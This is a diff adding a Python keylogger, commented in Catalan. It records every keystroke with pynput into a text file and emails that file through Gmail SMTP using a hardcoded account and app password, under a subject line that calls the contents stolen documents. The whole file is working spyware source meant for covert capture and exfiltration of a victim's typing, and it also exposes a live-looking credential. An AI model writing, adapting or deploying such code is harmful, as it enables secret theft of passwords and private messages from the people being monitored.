@@ -1,0 +1,101 @@
+#llibreria base del projecte. Desde aquesta llibreria capte constantment les lletres del teclat.
+from pynput.keyboard import Key, Listener
+
+#llibreries de email
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+import smtplib
+
+#desar informació de totes les tecles. Identificador "key_zara.text"
+keys_information = "key_zara.txt"
+
+#en el el direcori que es desarà
+file_path = "C:\\Users\\Usuario\\Desktop\\python" #directori on es troba el archiu key_zara.txt asegura que es doble \\ perque sigui surtir la sentencia
+extend = "\\" 
+#variables per contar cada tecla
+count = 0
+keys =[]
+#enviar informació al correu
+email_address = "cyberprueba2023@gmail.com " 
+password = "omwihhplymhfxsfc " #códi que ha sigut generat per gmail a les aplicacions
+toaddr = " " # Enter the email address you want to send your information to
+
+def send_email(filename, attachment, toaddr):
+
+    fromaddr = email_address
+
+#declaro una clase msg de misatge
+    msg = MIMEMultipart()
+
+    msg['From'] = fromaddr
+
+    msg['To'] = toaddr
+
+    msg['Subject'] = "Aqui tienes los documentos robados"
+
+    body = "Body_of_the_mail"
+
+    msg.attach(MIMEText(body, 'plain'))
+
+    filename = filename
+    attachment = open(attachment, 'rb')
+#manera de com obrir el document depenent si es un .png o .doc .txt
+    p = MIMEBase('application', 'octet-stream')
+
+    p.set_payload((attachment).read())
+
+    encoders.encode_base64(p)
+
+    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
+
+    msg.attach(p)
+
+#aqui que comença a enviar 
+    s = smtplib.SMTP('smtp.gmail.com', 587)
+
+    s.starttls()
+
+    s.login(fromaddr, password)
+
+    text = msg.as_string()
+
+    s.sendmail(fromaddr, toaddr, text)
+
+    s.quit()
+
+send_email(keys_information, file_path + extend + keys_information, toaddr)
+
+
+#declaració del mòdul on_press(key) per saber les lletres introïduides.
+#primera función: detecció de quin tecla a sigut presionada
+def on_press(key):
+    global keys, count                     #variables que no estan en aquest main. Son com les llibreries importades
+    print(key)                             #imprimeixo les tecles
+    keys.append(key)                       #les tecles les deso a una llista. Declarada adalt keys=[]
+    count += 1                             #per que no em solapin les lletres
+    if count >= 1:                         #para más de una tecla
+         count = 0
+         write_file(keys)
+         keys = []
+
+#encarregat de escriure
+def write_file(keys):
+    with open(file_path + extend +keys_information, "a") as f:    #important que no es destrueixi cada cop que escriu per tant li posem el paràmetre "a"
+                                                                    #fem que sigui més leible amb unes modificacions
+        for key in keys:                                            #recordem que em desat a una llista
+            k = str(key).replace("'", "")
+            if k.find("space") > 0:
+                f.write("\n")
+                f.close()
+            elif k.find("Key") == -1:
+                f.write(k)
+                f.close()
+
+#detención del programa
+def on_release(key):
+    if key == Key.esc:
+        return False
+with Listener(on_press=on_press, on_release=on_release) as listener:#creació del objecte listener    
+    listener.join()
